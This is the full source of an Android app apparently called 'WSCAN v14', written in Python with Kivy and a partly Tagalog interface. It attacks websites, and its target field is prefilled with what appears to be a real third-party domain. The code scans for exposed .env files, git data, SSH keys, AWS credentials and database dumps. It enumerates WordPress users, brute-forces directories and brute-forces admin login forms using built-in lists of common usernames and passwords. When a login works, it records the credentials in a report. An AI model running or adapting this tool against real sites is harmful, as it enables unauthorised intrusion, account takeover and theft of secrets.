#!/usr/bin/env python3
"""
WSCAN v14 — Beautiful APK
Modern dark UI + WordPress scan + auto exploit subdomains
"""
import threading, re, os, json, socket, random, hashlib, ssl
from datetime import datetime
from urllib.parse import urljoin, urlparse

import requests, urllib3
from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.metrics import dp, sp
from kivy.graphics import Color, RoundedRectangle, Line
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.progressbar import ProgressBar
from kivy.uix.scrollview import ScrollView
from kivy.uix.spinner import Spinner
from kivy.uix.widget import Widget
from kivy.uix.behaviors import ButtonBehavior

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =========================================================
#  🎨 THEME
# =========================================================
BG_DARK = (0.05, 0.06, 0.09, 1)
BG_CARD = (0.11, 0.13, 0.17, 1)
BG_INPUT = (0.07, 0.09, 0.12, 1)
ACCENT = (0.29, 0.62, 0.96, 1)
ACCENT_2 = (0.55, 0.36, 0.96, 1)
GREEN = (0.22, 0.78, 0.42, 1)
RED = (0.90, 0.24, 0.32, 1)
YELLOW = (0.98, 0.75, 0.20, 1)
ORANGE = (0.98, 0.55, 0.20, 1)
CYAN = (0.35, 0.85, 0.90, 1)
PINK = (0.92, 0.35, 0.62, 1)
TEXT = (0.90, 0.92, 0.96, 1)
TEXT_DIM = (0.55, 0.60, 0.68, 1)
BORDER = (0.20, 0.24, 0.30, 1)

STOP = {"stop": False}
LOG_CB = None
PROG_CB = None
STATS_CB = None
STATUS_CB = None

# =========================================================
#  🎨 CUSTOM WIDGETS
# =========================================================
class Card(BoxLayout):
    def __init__(self, bg_color=BG_CARD, radius=dp(14), **kw):
        super().__init__(**kw)
        self.bg_color = bg_color
        self.radius = radius
        with self.canvas.before:
            Color(*bg_color)
            self._rect = RoundedRectangle(pos=self.pos, size=self.size,
                                           radius=[radius])
            Color(*BORDER)
            self._border = Line(rounded_rectangle=(self.x, self.y,
                                                     self.width, self.height,
                                                     radius), width=1.1)
        self.bind(pos=self._update, size=self._update)

    def _update(self, *a):
        self._rect.pos = self.pos
        self._rect.size = self.size
        r = self.radius
        self._border.rounded_rectangle = (self.x, self.y,
                                            self.width, self.height, r)


class RoundButton(ButtonBehavior, Label):
    def __init__(self, bg=(0.2,0.5,0.9,1), fg=(1,1,1,1), radius=dp(12), **kw):
        super().__init__(**kw)
        self.bg = bg
        self.color = fg
        self.bold = True
        self.radius = radius
        with self.canvas.before:
            Color(*bg)
            self._rect = RoundedRectangle(pos=self.pos, size=self.size,
                                           radius=[radius])
        self.bind(pos=self._u, size=self._u)

    def _u(self, *a):
        self._rect.pos = self.pos
        self._rect.size = self.size


class StatBox(BoxLayout):
    def __init__(self, icon="📊", color=ACCENT, **kw):
        super().__init__(orientation="vertical", padding=dp(6), spacing=dp(2), **kw)
        with self.canvas.before:
            Color(0.14, 0.16, 0.21, 1)
            self._r = RoundedRectangle(pos=self.pos, size=self.size,
                                        radius=[dp(10)])
        self.bind(pos=self._u, size=self._u)
        self.icon_lbl = Label(text=icon, font_size=sp(22),
                               size_hint_y=0.5, color=color)
        self.num_lbl = Label(text="0", font_size=sp(22), bold=True,
                              size_hint_y=0.5, color=(1,1,1,1))
        self.add_widget(self.icon_lbl)
        self.add_widget(self.num_lbl)

    def _u(self, *a):
        self._r.pos = self.pos
        self._r.size = self.size

    def set_value(self, v):
        self.num_lbl.text = str(v)


# =========================================================
#  🔧 HELPERS
# =========================================================
def log(msg, color=None):
    if LOG_CB: Clock.schedule_once(lambda dt: LOG_CB(msg, color))

def prog(cur, tot):
    if PROG_CB: Clock.schedule_once(lambda dt: PROG_CB(cur, tot))

def set_stats(v=0, d=0, a=0, s=0):
    if STATS_CB: Clock.schedule_once(lambda dt: STATS_CB(v, d, a, s))

def set_status(txt, color=None):
    if STATUS_CB: Clock.schedule_once(lambda dt: STATUS_CB(txt, color))

def norm(u):
    if not u.startswith(("http://","https://")): u = "http://" + u
    return u.rstrip("/") + "/"

UAS = [
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/119.0 Mobile Safari/537.36",
]

def hdrs():
    return {"User-Agent": random.choice(UAS),
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"}

def fetch(url, method="GET", data=None, allow_redirects=False, session=None):
    if STOP["stop"]: return None
    try:
        s = session or requests
        return s.request(method, url, headers=hdrs(), timeout=10,
                         verify=False, allow_redirects=allow_redirects, data=data)
    except Exception:
        return None

def title(h):
    m = re.search(r"<title[^>]*>(.*?)</title>", h or "", re.I|re.S)
    return m.group(1).strip()[:80] if m else ""

def looks_html(t):
    if not t: return False
    low = t.lower()[:800]
    return any(x in low for x in ["<!doctype","<html","<head","<body"])

# =========================================================
#  📚 WORLISTS
# =========================================================
PATHS = list(dict.fromkeys("""
index index.php home main config config.php settings login logout signin
admin admin.php administrator administrator/ adminpanel
wp-admin wp-login.php wp-content wp-includes wp-json xmlrpc.php
readme.html license.txt user users account profile api api/ api/v1 api/v2
rest graphql swagger swagger.json openapi.json docs documentation dev test
testing staging demo backup backups config.php.bak .env .env.local .env.backup
.env.prod .env.production .git/HEAD .git/config .svn/entries .htaccess .htpasswd
.htaccess.bak .DS_Store .ssh/id_rsa .aws/credentials id_rsa
composer.json composer.lock package.json requirements.txt Dockerfile
settings.py local_settings.py web.config application.properties
phpinfo.php info.php test.php debug.php server-status server-info
robots.txt sitemap.xml security.txt
backup.sql db.sql dump.sql database.sql backup.zip backup.tar.gz
logs/error.log logs/access.log logs/debug.log error.log access.log debug.log
phpmyadmin/ pma/ adminer.php adminer/
uploads/ upload/ files/ media/ images/ assets/ static/ public/ download/
administrator/index.php administrator/login.php
wp-admin/admin.php wp-admin/admin-ajax.php wp-admin/install.php
wp-content/uploads/ wp-content/plugins/ wp-content/themes/ wp-content/debug.log
wp-config.php.bak wp-config.php~ wp-config.php.old
configuration.php sites/default/settings.php db.sqlite3
actuator/env actuator/health actuator/heapdump
admin1 admin2 admin123 login.php login.html signin.php user/login
admin/login.php admin/index.php dashboard/ panel/ cpanel/ backend/
""".split()))

USERS = list(dict.fromkeys("""
admin Admin ADMIN administrator Administrator root Root USER user test Test
guest Guest manager Manager operator superuser sysadmin webmaster support info
demo master owner super staff helpdesk tech it service system developer dev
engineer api apiuser web mobile mysql postgres database sa dba oracle admin1
admin2 Admin1 Admin2 admin123 Admin123 wp-admin wpuser wp
""".split()))

PWDS = list(dict.fromkeys("""
admin Admin ADMIN admin123 Admin123 ADMIN123 admin1234 Admin1234 password
Password PASSWORD password123 Password123 password1 123456 12345678 12345 1234
123 000000 111111 qwerty Qwerty qwerty123 abc123 letmein letmein123 welcome
Welcome welcome1 welcome123 changeme changeme123 root Root root123 toor
test Test test123 test1234 demo Demo demo123 guest guest123 master secret
secret123 admin@123 Admin@123 admin@2024 admin@2025 admin@2026 iloveyou
monkey dragon shadow trustno1 1q2w3e 1q2w3e4r 1qaz2wsx p@ssw0rd P@ssw0rd
pa$$word r00t adm1n user123 user@123 Password1 Password@123 Welcome@123
""".split()))

SUBS = list(dict.fromkeys("""
www mail ftp webmail smtp pop imap mx admin administrator cpanel dev dev1 dev2
dev3 stage staging test testing tester beta alpha demo sandbox api api1 api2
api-v1 api-v2 rest graphql app apps mobile blog forum shop store wiki support
help docs cdn static assets media files upload img images us eu asia ph sg hk
jp kr au uk srv server host node web01 web02 web1 web2 db database mysql vpn
sso auth login monitor ns1 ns2 dns git svn repo jenkins ci cd build jira
confluence gitlab github bitbucket new old v1 v2 v3 v4 internal intranet
portal dashboard panel aws azure cloud local private public
""".split()))

VULNS = [
    ("/.env", r"^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", "CRITICAL", "DB passwords/API keys"),
    ("/.env.backup", r"^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", "CRITICAL", "old creds"),
    ("/.env.production", r"^[A-Z][A-Z0-9_]{2,}\s*=\s*\S+", "CRITICAL", "prod creds"),
    ("/.git/HEAD", r"^ref:\s+refs/", "HIGH", "source code"),
    ("/.git/config", r"\[core\]", "HIGH", "repo info"),
    ("/phpinfo.php", r"<title>phpinfo\(\)</title>", "HIGH", "server info"),
    ("/info.php", r"<title>phpinfo\(\)</title>", "HIGH", "server info"),
    ("/wp-config.php.bak", r"define\s*\(\s*['\"]DB_PASSWORD", "CRITICAL", "WP DB"),
    ("/wp-config.php~", r"define\s*\(\s*['\"]DB_PASSWORD", "CRITICAL", "WP DB"),
    ("/backup.sql", r"INSERT INTO\s+`?\w+", "CRITICAL", "database"),
    ("/db.sql", r"INSERT INTO\s+`?\w+", "CRITICAL", "database"),
    ("/dump.sql", r"INSERT INTO\s+`?\w+", "CRITICAL", "database"),
    ("/actuator/env", r"\"propertySources\"", "CRITICAL", "secrets"),
    ("/.htpasswd", r"^[a-zA-Z0-9_\-\.]+:\$", "HIGH", "hashes"),
    ("/settings.py", r"SECRET_KEY\s*=\s*['\"]", "CRITICAL", "Django secrets"),
    ("/db.sqlite3", r"SQLite format 3", "CRITICAL", "database"),
    ("/.aws/credentials", r"aws_access_key_id", "CRITICAL", "AWS keys"),
    ("/id_rsa", r"-----BEGIN.*PRIVATE KEY-----", "CRITICAL", "SSH key"),
]

# =========================================================
#  🔍 SCANNER ENGINE
# =========================================================
def is_real(t, path):
    if not t or len(t) < 15: return False
    low = t.lower()
    if looks_html(t) and not path.endswith((".html",".htm",".php",".asp",".aspx",".jsp")):
        if "phpinfo" not in path.lower(): return False
    for ph in ["page not found","404 not found","does not exist","no such file",
               "access denied","forbidden"]:
        if ph in low: return False
    if ".env" in path:
        n = len([l for l in t.split("\n") if re.match(r"^[A-Z][A-Z0-9_]{2,}\s*=", l.strip())])
        if n < 2: return False
    return True

def get_base(url):
    bl = []
    for _ in range(3):
        r = fetch(urljoin(url, "".join(random.choices("abcdefghijk", k=20))))
        if r:
            bl.append({"code": r.status_code, "size": len(r.content),
                       "hash": hashlib.md5(r.text.encode("utf-8","ignore")).hexdigest()})
    return bl

def is_soft(r, bl):
    h = hashlib.md5(r.text.encode("utf-8","ignore")).hexdigest()
    for b in bl:
        if r.status_code == b["code"] and abs(len(r.content)-b["size"]) < 100: return True
        if h == b["hash"]: return True
    return False

def run_vuln(base):
    log(f"🔎 Vuln scan ({len(VULNS)} checks)", CYAN)
    set_status("Scanning vulnerabilities...", CYAN)
    bl = get_base(base)
    found = []
    for i, (path, pat, sev, desc) in enumerate(VULNS, 1):
        if STOP["stop"]: break
        prog(i, len(VULNS))
        url = urljoin(base, path.lstrip("/"))
        r = fetch(url)
        if not r or r.status_code != 200: continue
        if is_soft(r, bl): continue
        if not re.search(pat, r.text, re.I|re.M): continue
        if not is_real(r.text, path): continue
        col = RED if sev == "CRITICAL" else ORANGE if sev == "HIGH" else YELLOW
        log(f"  [{sev}] {desc}", col)
        log(f"     → {url}", TEXT_DIM)
        found.append({"url": url, "sev": sev, "desc": desc})
    if not found: log("  ✓ Walang verified na vuln", GREEN)
    return found

def run_dir(base):
    log(f"💥 Directory brute ({len(PATHS)} paths)", ACCENT)
    set_status("Brute-forcing directories...", ACCENT)
    bl = get_base(base)
    hits = []
    for i, w in enumerate(PATHS, 1):
        if STOP["stop"]: break
        if i % 3 == 0 or i == len(PATHS): prog(i, len(PATHS))
        r = fetch(urljoin(base, w))
        if not r: continue
        if r.status_code not in (200,301,302,401,403): continue
        if r.status_code == 200 and is_soft(r, bl): continue
        note = ""
        if r.status_code == 200:
            if "Index of /" in r.text: note = "📂 OPEN DIR"
            elif title(r.text): note = f"page: {title(r.text)}"
        elif r.status_code == 401: note = "Basic Auth"
        elif r.status_code == 403: note = "Forbidden"
        col = GREEN if r.status_code == 200 else YELLOW if r.status_code in (301,302) else PINK if r.status_code == 403 else CYAN
        log(f"  [{r.status_code}] {r.url}", col)
        if note: log(f"     {note}", TEXT_DIM)
        hits.append({"code": r.status_code, "url": r.url, "note": note})
    if not hits: log("  ✓ Walang nahanap na extra paths", GREEN)
    return hits

def find_logins(base, hits):
    cands = []
    for h in hits:
        if h["code"] in (200,401) and re.search(
            r"(login|signin|admin|auth|panel|dashboard|wp-login|administrator)",
            h["url"], re.I):
            cands.append(h["url"])
    for p in ["admin/","admin/login.php","administrator/","wp-login.php",
              "login","login.php","admin.php","user/login"]:
        cands.append(urljoin(base, p))
    return list(dict.fromkeys(cands))

def verify(url, html, uf, pf, u, p):
    action = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
    target = urljoin(url, action.group(1)) if action else url
    mm = re.search(r'<form[^>]*method=["\']([^"\']*)["\']', html, re.I)
    method = mm.group(1).upper() if mm else "POST"
    s = requests.Session()
    fetch(url, session=s)
    r = fetch(target, method=method, data={uf: u, pf: p},
              allow_redirects=False, session=s)
    if not r: return False, "request failed"
    cookies = dict(s.cookies)
    if not cookies: return False, "walang cookie"
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}/"
    for path in ["admin/","wp-admin/","dashboard/","panel/"]:
        rr = fetch(urljoin(base_url, path), allow_redirects=False, session=s)
        if not rr: continue
        if rr.status_code == 200 and not re.search(
            r'<input[^>]*type=["\']password["\']', rr.text, re.I):
            return True, "admin accessible"
        if rr.status_code in (301,302):
            loc = rr.headers.get("Location","").lower()
            if not any(x in loc for x in ["login","signin","error"]):
                return True, "redirect admin"
    if any(x in " ".join(cookies.keys()).lower() for x in ["session","auth","logged"]):
        return True, "session cookie"
    return False, "no access"

def run_admin(base, hits, max_creds=300):
    log(f"🔐 Admin brute (max {max_creds})", YELLOW)
    set_status("Brute-forcing admin panel...", YELLOW)
    cands = find_logins(base, hits)
    attempts = 0
    found = []
    for url in cands:
        if STOP["stop"]: break
        if attempts >= max_creds: break
        r = fetch(url)
        if not r or r.status_code not in (200,401): continue
        uf = re.search(r'<input[^>]*name=["\'](user(name)?|email|login|uname|username|log)["\']', r.text, re.I)
        pf = re.search(r'<input[^>]*name=["\'](pass(word)?|pwd|passwd)["\']', r.text, re.I)
        if not (uf and pf): continue
        uf_n, pf_n = uf.group(1), pf.group(1)
        log(f"  🔍 {url} ({uf_n}/{pf_n})", (0.9,0.6,0.9,1))
        for u, p in [(a,b) for a in USERS for b in PWDS]:
            if STOP["stop"]: break
            if attempts >= max_creds: break
            attempts += 1
            if attempts % 5 == 0: prog(attempts, max_creds)
            rr = fetch(url, method="POST", data={uf_n: u, pf_n: p},
                       allow_redirects=False)
            if not rr: continue
            body = rr.text or ""
            cand = False
            if rr.status_code in (301,302,303,307):
                loc = rr.headers.get("Location","").lower()
                if loc and not any(x in loc for x in ["login","signin","error","auth"]):
                    cand = True
            elif rr.status_code == 200 and "set-cookie" in {k.lower() for k in rr.headers}:
                if not re.search(r"invalid|incorrect|failed|wrong|error", body, re.I):
                    if re.search(r"logout|dashboard|welcome|profile", body, re.I):
                        cand = True
            if cand:
                log(f"  ⚠  Candidate {u}:{p} — verifying...", YELLOW)
                ok_v, reason = verify(url, r.text, uf_n, pf_n, u, p)
                if ok_v:
                    log(f"  🔓 VERIFIED: {u} : {p}", GREEN)
                    log(f"     {url}", TEXT_DIM)
                    found.append({"url": url, "creds": (u,p)})
                    STOP["stop"] = True
                    return found
                else:
                    log(f"  ✗ FP: {reason}", (1,0.5,0.5,1))
    if not found: log("  ✓ Walang admin na nabuksan", GREEN)
    return found

def run_subs(base):
    host = urlparse(base).hostname or ""
    if re.match(r"^\d+\.\d+\.\d+\.\d+$", host):
        log("  [!] IP target — skip subs", YELLOW)
        return []
    parts = host.split(".")
    rd = ".".join(parts[-2:])
    scheme = "https" if base.startswith("https") else "http"
    found = []
    log(f"🌐 Subdomain scan ({len(SUBS)} subs)", (0.5,0.4,1,1))
    set_status("Finding subdomains...", (0.5,0.4,1,1))
    for i, sub in enumerate(SUBS, 1):
        if STOP["stop"]: break
        if i % 3 == 0 or i == len(SUBS): prog(i, len(SUBS))
        full = f"{sub}.{rd}"
        try: socket.gethostbyname(full)
        except socket.gaierror: continue
        for sch in (scheme, "https" if scheme=="http" else "http"):
            url = f"{sch}://{full}/"
            r = fetch(url)
            if r:
                log(f"  ✓ {url} [{r.status_code}]", GREEN)
                found.append({"url": url, "code": r.status_code})
                break
    if not found: log("  ✓ Walang subdomain na nahanap", GREEN)
    return found

def run_wp(base):
    log("📝 WordPress deep scan", (0.4,0.6,1,1))
    set_status("Scanning WordPress...", (0.4,0.6,1,1))
    found = []
    r = fetch(urljoin(base, "readme.html"))
    if r and r.status_code == 200:
        m = re.search(r"Version\s+([\d\.]+)", r.text)
        if m:
            log(f"  [LOW] WP v{m.group(1)}", YELLOW)
            found.append({"sev":"LOW","desc":f"WP v{m.group(1)}"})
    r = fetch(urljoin(base, "wp-json/wp/v2/users"))
    if r and r.status_code == 200:
        try:
            us = json.loads(r.text)
            if us and isinstance(us, list):
                names = [u.get("slug","?") for u in us[:5]]
                log(f"  [HIGH] Users: {','.join(names)}", ORANGE)
                found.append({"sev":"HIGH","desc":f"Users: {','.join(names)}"})
        except: pass
    r = fetch(urljoin(base, "xmlrpc.php"))
    if r and r.status_code == 200 and "XML-RPC" in r.text:
        log("  [MED] XML-RPC bukas", YELLOW)
        found.append({"sev":"MEDIUM","desc":"XML-RPC bukas"})
    r = fetch(urljoin(base, "wp-content/debug.log"))
    if r and r.status_code == 200 and "PHP" in r.text:
        log("  [HIGH] debug.log bukas", ORANGE)
        found.append({"sev":"HIGH","desc":"debug.log bukas"})
    if not found: log("  ✓ Walang WP findings", GREEN)
    return found

def save_report(base, outdir, vulns, dirs, admin, subs, wp):
    try:
        os.makedirs(outdir, exist_ok=True)
        L = ["="*56, "WSCAN v14 REPORT",
             f"Target: {base}",
             f"Oras: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             "="*56, ""]
        if wp:
            L.append(f"WORDPRESS ({len(wp)})")
            for w in wp: L.append(f"  [{w['sev']}] {w['desc']}")
            L.append("")
        if vulns:
            L.append(f"VULNERABILITIES ({len(vulns)})")
            for v in vulns:
                L.append(f"  [{v['sev']}] {v['desc']}")
                L.append(f"    {v['url']}")
            L.append("")
        if admin:
            L.append(f"ADMIN ACCESS ({len(admin)})")
            for a in admin:
                u, p = a["creds"]
                L.append(f"  {a['url']}")
                L.append(f"    Username: {u}")
                L.append(f"    Password: {p}")
            L.append("")
        if dirs:
            L.append(f"DIRECTORIES ({len(dirs)})")
            for d in dirs[:60]:
                L.append(f"  [{d['code']}] {d['url']} {d['note']}")
            L.append("")
        if subs:
            L.append(f"SUBDOMAINS ({len(subs)})")
            for s in subs: L.append(f"  {s['url']} [{s['code']}]")
        L.append(""); L.append("="*56)
        path = os.path.join(outdir, "REPORT.txt")
        with open(path, "w", encoding="utf-8") as f: f.write("\n".join(L))
        return path
    except Exception as e:
        return f"error: {e}"

def run_all(url, mode, max_creds, outdir):
    STOP["stop"] = False
    base = norm(url)
    log("=" * 44, TEXT_DIM)
    log(f"🎯 Target: {base}", ACCENT)
    log(f"⚙️  Mode: {mode}", ACCENT)
    log("=" * 44, TEXT_DIM)

    vulns=[]; dirs=[]; admin=[]; subs=[]; wp=[]
    if mode in ("full","wp"):
        wp = run_wp(base)
        set_stats(len(vulns), len(dirs), len(admin), len(subs))
    if mode in ("full","vuln"):
        vulns = run_vuln(base)
        set_stats(len(vulns), len(dirs), len(admin), len(subs))
    if mode in ("full","dir"):
        dirs = run_dir(base)
        set_stats(len(vulns), len(dirs), len(admin), len(subs))
    if mode in ("full","admin"):
        admin = run_admin(base, dirs, max_creds)
        set_stats(len(vulns), len(dirs), len(admin), len(subs))
    if mode in ("full","sub"):
        subs = run_subs(base)
        set_stats(len(vulns), len(dirs), len(admin), len(subs))

    set_status("Saving report...", CYAN)
    path = save_report(base, outdir, vulns, dirs, admin, subs, wp)
    log("", None)
    log("=" * 44, TEXT_DIM)
    if path.startswith("error:"):
        log(f"❌ {path}", RED)
    else:
        log(f"✅ TAPOS! Report: {path}", GREEN)
    log("=" * 44, TEXT_DIM)
    set_status("Ready", GREEN)


# =========================================================
#  📱 MAIN UI
# =========================================================
class WScanApp(App):
    def build(self):
        self.title = "WSCAN"
        Window.clearcolor = BG_DARK

        main_scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        root = BoxLayout(orientation="vertical", padding=dp(10),
                         spacing=dp(10), size_hint_y=None)
        root.bind(minimum_height=root.setter("height"))

        # HEADER
        header = BoxLayout(orientation="vertical", size_hint_y=None,
                            height=dp(70), padding=[dp(4), 0])
        header.add_widget(Label(text="[b]⚡ WSCAN[/b]", markup=True,
                                 font_size=sp(30), bold=True,
                                 color=ACCENT, size_hint_y=0.6))
        header.add_widget(Label(text="[i]WordPress + Universal Scanner v14[/i]",
                                 markup=True, font_size=sp(12),
                                 color=TEXT_DIM, size_hint_y=0.4))
        root.add_widget(header)

        # URL INPUT
        url_card = Card(orientation="vertical", size_hint_y=None,
                         height=dp(105), padding=dp(12), spacing=dp(8))
        url_card.add_widget(Label(text="📍  Target URL", font_size=sp(13),
                                   bold=True, color=TEXT,
                                   size_hint_y=None, height=dp(20),
                                   halign="left", valign="middle"))
        url_card.children[-1].bind(size=lambda l, v: setattr(l, "text_size", (l.width, None)))
        self.url_input = TextInput(text="https://becamon.com.ph",
                                    multiline=False, font_size=sp(14),
                                    size_hint_y=None, height=dp(46),
                                    background_color=BG_INPUT,
                                    foreground_color=TEXT,
                                    cursor_color=ACCENT,
                                    hint_text="https://example.com",
                                    padding=[dp(12), dp(12)])
        url_card.add_widget(self.url_input)
        root.add_widget(url_card)

        # OPTIONS
        opts_card = Card(orientation="vertical", size_hint_y=None,
                          height=dp(100), padding=dp(12), spacing=dp(8))
        opts_card.add_widget(Label(text="⚙️  Options", font_size=sp(13),
                                    bold=True, color=TEXT,
                                    size_hint_y=None, height=dp(20),
                                    halign="left", valign="middle"))
        opts_card.children[-1].bind(size=lambda l, v: setattr(l, "text_size", (l.width, None)))

        row = BoxLayout(orientation="horizontal", size_hint_y=None,
                         height=dp(46), spacing=dp(8))
        mode_box = BoxLayout(orientation="vertical", size_hint_x=0.6, spacing=dp(2))
        mode_box.add_widget(Label(text="Mode", font_size=sp(11),
                                   color=TEXT_DIM,
                                   size_hint_y=None, height=dp(14)))
        self.mode_spinner = Spinner(text="full",
                                     values=("full","wp","vuln","dir","admin","sub"),
                                     font_size=sp(13),
                                     background_color=(0.18,0.24,0.36,1),
                                     size_hint_y=None, height=dp(32))
        mode_box.add_widget(self.mode_spinner)
        row.add_widget(mode_box)

        max_box = BoxLayout(orientation="vertical", size_hint_x=0.4, spacing=dp(2))
        max_box.add_widget(Label(text="Max creds", font_size=sp(11),
                                   color=TEXT_DIM,
                                   size_hint_y=None, height=dp(14)))
        self.max_input = TextInput(text="300", input_filter="int", multiline=False,
                                    font_size=sp(13), size_hint_y=None, height=dp(32),
                                    background_color=BG_INPUT,
                                    foreground_color=TEXT,
                                    cursor_color=ACCENT,
                                    padding=[dp(8), dp(8)])
        max_box.add_widget(self.max_input)
        row.add_widget(max_box)
        opts_card.add_widget(row)
        root.add_widget(opts_card)

        # BUTTONS
        btn_card = Card(orientation="vertical", size_hint_y=None,
                         height=dp(120), padding=dp(12), spacing=dp(10),
                         bg_color=(0.09,0.11,0.15,1))
        self.start_btn = RoundButton(text="[b]▶   START SCAN[/b]", markup=True,
                                      bg=GREEN, fg=(1,1,1,1),
                                      font_size=sp(18), size_hint_y=None,
                                      height=dp(58))
        self.start_btn.bind(on_release=self.start_scan)
        btn_card.add_widget(self.start_btn)

        small_row = BoxLayout(orientation="horizontal", size_hint_y=None,
                                height=dp(38), spacing=dp(8))
        self.stop_btn = RoundButton(text="[b]⏹  STOP[/b]", markup=True,
                                     bg=RED, fg=(1,1,1,1), font_size=sp(13))
        self.stop_btn.bind(on_release=self.stop_scan)
        small_row.add_widget(self.stop_btn)

        self.clear_btn = RoundButton(text="[b]🗑  CLEAR[/b]", markup=True,
                                      bg=(0.28,0.32,0.40,1), fg=(1,1,1,1),
                                      font_size=sp(13))
        self.clear_btn.bind(on_release=self.clear_log)
        small_row.add_widget(self.clear_btn)
        btn_card.add_widget(small_row)
        root.add_widget(btn_card)

        # STATUS
        status_card = Card(orientation="vertical", size_hint_y=None,
                            height=dp(80), padding=dp(12), spacing=dp(8))
        self.status_lbl = Label(text="● Ready", font_size=sp(13), bold=True,
                                 color=GREEN, size_hint_y=None, height=dp(20),
                                 halign="left", valign="middle")
        self.status_lbl.bind(size=lambda l, v: setattr(l, "text_size", (l.width, None)))
        status_card.add_widget(self.status_lbl)
        self.progress = ProgressBar(max=100, value=0,
                                     size_hint_y=None, height=dp(14))
        status_card.add_widget(self.progress)
        root.add_widget(status_card)

        # STATS
        stats_card = Card(orientation="vertical", size_hint_y=None,
                           height=dp(105), padding=dp(12), spacing=dp(6))
        stats_card.add_widget(Label(text="📊  Live Stats", font_size=sp(13),
                                     bold=True, color=TEXT,
                                     size_hint_y=None, height=dp(20),
                                     halign="left", valign="middle"))
        stats_card.children[-1].bind(size=lambda l, v: setattr(l, "text_size", (l.width, None)))
        stats_row = BoxLayout(orientation="horizontal", size_hint_y=None,
                                height=dp(60), spacing=dp(8))
        self.stat_vuln = StatBox(icon="🚨", color=RED)
        self.stat_dirs = StatBox(icon="📂", color=ACCENT)
        self.stat_admin = StatBox(icon="🔓", color=GREEN)
        self.stat_subs = StatBox(icon="🌐", color=ACCENT_2)
        stats_row.add_widget(self.stat_vuln)
        stats_row.add_widget(self.stat_dirs)
        stats_row.add_widget(self.stat_admin)
        stats_row.add_widget(self.stat_subs)
        stats_card.add_widget(stats_row)
        root.add_widget(stats_card)

        # CONSOLE
        console_card = Card(orientation="vertical", size_hint_y=None,
                             height=dp(400), padding=dp(10), spacing=dp(6))
        console_card.add_widget(Label(text="📜  Live Output", font_size=sp(13),
                                       bold=True, color=TEXT,
                                       size_hint_y=None, height=dp(20),
                                       halign="left", valign="middle"))
        console_card.children[-1].bind(size=lambda l, v: setattr(l, "text_size", (l.width, None)))
        console_scroll = ScrollView(size_hint_y=None, height=dp(345))
        self.console_box = BoxLayout(orientation="vertical",
                                       size_hint_y=None, spacing=dp(1))
        self.console_box.bind(minimum_height=self.console_box.setter("height"))
        console_scroll.add_widget(self.console_box)
        console_card.add_widget(console_scroll)
        self.console_scroll = console_scroll
        root.add_widget(console_card)

        root.add_widget(Widget(size_hint_y=None, height=dp(20)))
        main_scroll.add_widget(root)
        wrapper = BoxLayout(orientation="vertical", padding=dp(4))
        wrapper.add_widget(main_scroll)

        global LOG_CB, PROG_CB, STATS_CB, STATUS_CB
        LOG_CB = self._log
        PROG_CB = self._prog
        STATS_CB = self._stats
        STATUS_CB = self._status

        self._log("👋 Welcome sa WSCAN!", ACCENT)
        self._log("📍 I-paste ang target URL sa itaas", TEXT_DIM)
        self._log("🎯 Piliin ang mode, tapos pindutin START", TEXT_DIM)
        self._log("─" * 40, TEXT_DIM)
        return wrapper

    def _log(self, msg, color=None):
        if color is None: color = TEXT
        lbl = Label(text=msg, font_size=sp(11), color=color,
                     size_hint_y=None, halign="left", valign="top",
                     text_size=(Window.width - dp(60), None),
                     padding=[dp(4), 0])
        lbl.bind(width=lambda l, w: setattr(l, "text_size", (w - dp(12), None)))
        lbl.bind(texture_size=lambda l, s: setattr(l, "height", s[1] + dp(4)))
        self.console_box.add_widget(lbl)
        if len(self.console_box.children) > 400:
            for _ in range(50):
                if self.console_box.children:
                    self.console_box.remove_widget(self.console_box.children[-1])
        Clock.schedule_once(lambda dt: setattr(self.console_scroll, "scroll_y", 0), 0.05)

    def _prog(self, cur, tot):
        self.progress.value = (cur / tot * 100) if tot else 0

    def _stats(self, v, d, a, s):
        self.stat_vuln.set_value(v)
        self.stat_dirs.set_value(d)
        self.stat_admin.set_value(a)
        self.stat_subs.set_value(s)

    def _status(self, txt, color=None):
        if color is None: color = TEXT
        self.status_lbl.text = f"● {txt}"
        self.status_lbl.color = color

    def start_scan(self, *args):
        url = self.url_input.text.strip()
        if not url:
            self._log("❌ Kailangan ng URL!", RED)
            self._status("Walang URL", RED)
            return
        mode = self.mode_spinner.text
        try: mc = int(self.max_input.text)
        except: mc = 300
        self.start_btn.disabled = True
        self.start_btn.opacity = 0.4
        self.stop_btn.disabled = False
        self.stop_btn.opacity = 1
        self._stats(0, 0, 0, 0)
        self.progress.value = 0
        self._status("Starting scan...", CYAN)
        outdir = "/storage/emulated/0/wscan_output"
        threading.Thread(target=self._run,
                          args=(url, mode, mc, outdir), daemon=True).start()

    def _run(self, url, mode, mc, outdir):
        try: run_all(url, mode, mc, outdir)
        except Exception as e:
            self._log(f"❌ ERROR: {e}", RED)
            self._status("Error", RED)
        finally:
            Clock.schedule_once(lambda dt: self._reset_buttons(), 0)

    def _reset_buttons(self):
        self.start_btn.disabled = False
        self.start_btn.opacity = 1
        self.stop_btn.disabled = True
        self.stop_btn.opacity = 0.4

    def stop_scan(self, *args):
        STOP["stop"] = True
        self._log("⏹  Stop requested...", YELLOW)
        self._status("Stopping...", YELLOW)

    def clear_log(self, *args):
        self.console_box.clear_widgets()
        self._log("🧹 Console cleared", TEXT_DIM)


if __name__ == "__main__":
    WScanApp().run()